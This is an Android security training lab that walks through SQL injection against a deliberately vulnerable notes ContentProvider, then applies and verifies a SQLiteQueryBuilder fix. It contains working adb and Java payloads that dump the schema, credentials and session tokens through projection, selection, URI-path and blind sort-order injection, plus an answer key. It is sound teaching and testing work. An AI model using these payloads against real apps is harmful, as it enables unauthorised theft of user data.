# Lab 02 — SQL Injection Through All Four Points

**Difficulty:** Intermediate
**Time:** 2–3 hours
**Prerequisites:** [Lab 01](lab-01-enumerate-and-read.md),
[Chapter 27 §3.4](../README.md#34-contentresolver--the-client-side),
[§5.1](../README.md#51-sql-injection-through-selection-projection-and-sortorder),
the target app from Lab 01 still installed.

---

## Objective

Exploit SQL injection through **all four** injection points of a provider's `query()` — projection,
selection, sort order, and the URI path itself — extract the database schema and a table the provider
never meant to expose, prove the sort-order channel is exploitable even with no visible output, then
apply the `SQLiteQueryBuilder` fix and confirm all four are closed.

## Why this matters

Almost every tutorial, checklist and automated scanner tests **selection** for injection and stops.
`projection` and `sortOrder` are injected into the statement as raw SQL text with no possible binding,
and the URI's last path segment is frequently concatenated into a `WHERE _id = …` with no binding
either. Drozer's `scanner.provider.injection` tests selection and projection but **not** sort order.
A tester who reports "no injection" after testing one channel has tested the route the developer
documented, not the routes the code accepts. This lab makes you exploit each of the four, and shows why
their payloads are *not* interchangeable.

> **📖 Definition**
> **SQL injection in a provider** is the concatenation of caller-controlled text into a SQL statement
> that the provider compiles, such that the caller can alter the statement's structure — reading tables,
> columns or rows the provider's author never intended to expose. The safe alternative is a **bound
> parameter** (`?` with `selectionArgs`), which SQLite substitutes as a value, never as SQL.

The target is `VulnerableNotesProvider` from [../examples/VulnerableNotesProvider.java](../examples/VulnerableNotesProvider.java).
Read its `query()` before you start — the four defects are labelled in comments, and the database is
seeded with a `notes` table (the intended surface) plus `users` and `session` tables (the loot).

---

## Setup

```bash
# host — confirm the target from Lab 01 is installed and exported
adb shell dumpsys package com.example.vuln | grep -A6 "Provider{"
adb shell content query --uri content://com.example.vuln.notes.provider/notes
```

Turn on the free confirmation channel — the vulnerable provider logs the SQL it builds:

```bash
# host — in a second terminal
adb logcat -c
adb logcat -s VulnNotesProvider
```

> **🔍 Pentester's Note**
> Debug logging inside a provider is itself a finding, and a gift when you have it: `adb logcat -s
> VulnNotesProvider` shows you the exact compiled SQL for every request, so you can see precisely which
> of your inputs reached the statement verbatim. When the target does *not* log, hook
> `SQLiteDatabase.rawQuery` with [../scripts/hook-provider.js](../scripts/hook-provider.js) to get the
> same visibility from the server side.

---

## Steps

### Step 1 — Selection injection (the one everyone knows)

The clause sits inside a `WHERE`, so close it and add your own condition.

```bash
# adb shell — dump every row regardless of the intended filter
content query --uri content://com.example.vuln.notes.provider/notes --where "1=1"
```

```bash
# adb shell — pull a different table entirely with UNION
content query --uri content://com.example.vuln.notes.provider/notes \
  --where "1=0 UNION SELECT _id, username, password FROM users --"
```

**Q1.** Read the logged SQL. Where exactly did your `--where` string land in the statement?

### Step 2 — Projection injection (a direct read)

The projection is the column list after `SELECT`. Its values come straight back in the cursor, so this
is a *direct* read, not a blind one — the most useful channel.

```bash
# adb shell — the first thing to run: dump the whole schema
content query --uri content://com.example.vuln.notes.provider/notes \
  --projection "(SELECT group_concat(name || ' => ' || sql, char(10)) FROM sqlite_master) AS schema"
```

```bash
# adb shell — now steal the users table the schema revealed
content query --uri content://com.example.vuln.notes.provider/notes \
  --projection "(SELECT group_concat(username || ':' || password, char(10)) FROM users) AS leak"
```

**Q2.** Why can this not be done with a bound parameter — i.e. why is there no "safe" version of a
caller-supplied projection? (Hint: the SQL/bind mapping table in
[§3.4](../README.md#34-contentresolver--the-client-side).)

**Q3.** Record the `users` table contents. What did you extract?

### Step 3 — URI-path injection

The vulnerable provider registers both `notes/#` (digits) and `notes/*` (any segment), and concatenates
`getLastPathSegment()` into `WHERE _id = …`. So a non-numeric "id" is valid SQL.

```bash
# adb shell — the path segment is concatenated with no binding
content query --uri "content://com.example.vuln.notes.provider/notes/1 OR 1=1"
```

```bash
# adb shell — URL-encoded, since spaces and quotes travel awkwardly
content query --uri "content://com.example.vuln.notes.provider/notes/0%20UNION%20SELECT%20_id,token,token%20FROM%20session--"
```

**Q4.** Read the logged SQL. Which `UriMatcher` route matched, and why did `notes/*` rather than
`notes/#` let the payload through?

### Step 4 — Sort-order injection (the one scanners miss)

The `ORDER BY` expression is concatenated with no binding. SQLite evaluates it, but the result is not
returned to you, so this is a blind channel. Use the query's success or failure as a one-bit oracle:
`abs(-9223372036854775808)` raises an integer-overflow error, so the query fails when your condition is
false and succeeds when it is true.

```bash
# adb shell — boolean oracle: does the session table have any rows?
content query --uri content://com.example.vuln.notes.provider/notes \
  --sort "CASE WHEN (SELECT count(*) FROM session)>0 THEN _id ELSE abs(-9223372036854775808) END"
```

```bash
# adb shell — leak the token one character at a time
content query --uri content://com.example.vuln.notes.provider/notes \
  --sort "CASE WHEN (SELECT substr(token,1,1) FROM session)='e' THEN _id ELSE abs(-9223372036854775808) END"
```

**Q5.** The first character of the seeded token is `e`. Confirm that the second command *succeeds* for
`'e'` and *fails* for a wrong guess. What is the observable difference between success and failure at
the `content` command level?

**Q6.** Roughly how many requests does it take to extract one character with a binary search over a
64-character alphabet? Why is this practical over local IPC even though it is one bit per request?

### Step 5 — Prove it from an unprivileged app

Everything above ran as UID 2000. Extend the probe app from Lab 01 to fire the projection payload —
projection injection is the cleanest to prove because the data comes straight back.

```java
// probe app — proving projection injection from an ordinary UID
Uri u = Uri.parse("content://com.example.vuln.notes.provider/notes");
try (Cursor c = getContentResolver().query(u,
        new String[]{ "(SELECT group_concat(username||':'||password) FROM users) AS leak" },
        null, null, null)) {
    if (c != null && c.moveToFirst()) {
        Log.i("PROBE", "LEAK: " + c.getString(0));
    }
} catch (SecurityException e) {
    Log.i("PROBE", "DENIED: " + e.getMessage());
}
```

**Q7.** Does the leak come back to the app? This is the line that goes in the report.

### Step 6 — Automate the four-point test

```bash
# host — the chapter's fuzzer tests all four points, including sortOrder
python3 ../scripts/provider-call-fuzz.py \
  --authority com.example.vuln.notes.provider --path notes --mode inject
```

**Q8.** Does the tool flag all four channels? Compare against what Drozer's scanner reports:

```
dz> run scanner.provider.injection -a com.example.vuln
```

Which channel does the Drozer scanner miss, and does the chapter tool catch it?

### Step 7 — Apply the fix and re-test

Replace the target's provider with [../examples/SecureNotesProvider.java](../examples/SecureNotesProvider.java)
(or apply the fix from [§5.1](../README.md#the-fix) to your copy: `SQLiteQueryBuilder` with
`setProjectionMap()` and `setStrict(true)`, a sort whitelist, and `ContentUris.parseId()` for the path).
Rebuild, reinstall, and re-run every payload from Steps 1–4.

**Q9.** For each of the four channels, what error or behaviour do you now get, and which specific control
stopped it?

**Q10.** The fixed `query()` still accepts a caller `selection` and ANDs it in. Explain why that is
*not* an injection now, referencing `setStrict(true)` and strict grammar.

---

## Hints

<details>
<summary>Hint 1 — my --projection payload throws "no such column"</summary>

Two causes. Either the payload has a typo (read the logged SQL to see the exact statement), or you are
testing the *fixed* provider, where `setProjectionMap()` rejects any column not in the allow-list —
which is the fix working. On the vulnerable provider, wrap the subquery and give it an alias:
`(SELECT ...) AS leak`.
</details>

<details>
<summary>Hint 2 — the sort-order oracle never fails</summary>

Confirm the false branch really errors. Test it in isolation:

```bash
content query --uri content://com.example.vuln.notes.provider/notes \
  --sort "abs(-9223372036854775808)"
```

That must throw. If it does not, your SQLite build handles the overflow differently — use
`(SELECT 1 FROM nonexistent_table)` as the error branch instead.
</details>

<details>
<summary>Hint 3 — spaces and quotes in --uri break the shell</summary>

Quote the whole URI and URL-encode spaces as `%20`, single quotes as `%27`, and slashes inside a
segment as `%2F`. The provider decodes them back before parsing.
</details>

---

## Solution

<details>
<summary>Answers</summary>

**Q1.** The `--where` string lands between `WHERE ` and ` ORDER BY`, i.e. `SELECT * FROM notes WHERE
1=0 UNION SELECT _id, username, password FROM users -- ORDER BY _id ASC`. The `--` comments out the
trailing `ORDER BY`.

**Q2.** A projection is a list of *column names*, and SQL has no bind-parameter form for identifiers —
you cannot write `SELECT ? FROM t` and bind a column name. So a caller-supplied projection is always
concatenated; the only defence is an allow-list (`setProjectionMap`), never binding.

**Q3.** `admin:s3cr3t-P@ss` and `alice:hunter2` from the `users` table — data the `notes` provider was
never meant to expose.

**Q4.** `notes/*` matched, because `*` matches any single segment while `#` matches digits only. The
non-numeric segment `1 OR 1=1` fails the `#` route and is caught by `*`, then concatenated into `_id =
1 OR 1=1`.

**Q5.** Success returns the note rows (ordered by `_id`); failure returns a SQLite error and no rows.
At the `content` level, success prints `Row: 0 ...` and failure prints an exception line. That
difference is your one-bit channel.

**Q6.** `log2(64) = 6`, so about 6–7 requests per character with a binary search (a `<`/`>` comparison
narrows the range each time). Over local Binder IPC each request is a few milliseconds, so a
20-character token is a few seconds — fully practical.

**Q7.** Yes — with the provider exported and no permission, the probe app's `query` returns the
concatenated credentials in column 0. That is the reproduced-from-an-app evidence the report needs.

**Q8.** The chapter tool flags all four (projection, selection, sortOrder, uri-path). Drozer's
`scanner.provider.injection` covers selection and projection but not sort order; the chapter tool
catches the sort-order channel it misses.

**Q9.** Projection → `setProjectionMap`/`setStrictColumns` rejects any column not in the map
(`java.lang.IllegalArgumentException: Invalid column`). Selection → strict grammar rejects statement
separators/subquery-escapes. Sort order → the whitelist substitutes `_id ASC` for anything not in
`SORTS`. URI path → `ContentUris.parseId()` throws `NumberFormatException` on a non-numeric segment, so
it can never be SQL text.

**Q10.** With `setStrict(true)` the selection is parsed by a real tokeniser that rejects anything trying
to escape its parentheses — statement separators, comments, unbalanced parens, subqueries where they do
not belong. The caller's selection can only *narrow* the already package-scoped `WHERE`, and its values
still go through `selectionArgs`. Flexibility without the escape hatch.

</details>

---

## Success criteria

- [ ] You exploited selection injection and read the logged/hooked SQL to see where your input landed
- [ ] You used projection injection to dump `sqlite_master` and then the `users` table
- [ ] You exploited URI-path injection and explained why `notes/*` let it through
- [ ] You extracted at least one character of the session token through the blind sort-order oracle
- [ ] You can explain why projection and sort order cannot be bound, and selection can
- [ ] You reproduced the injection from an unprivileged app, not just `adb shell`
- [ ] You ran the four-point fuzzer and identified the channel Drozer's scanner misses
- [ ] You applied the `SQLiteQueryBuilder` fix and confirmed all four channels are closed
- [ ] You can state the two-line remediation that closes the entire injection class
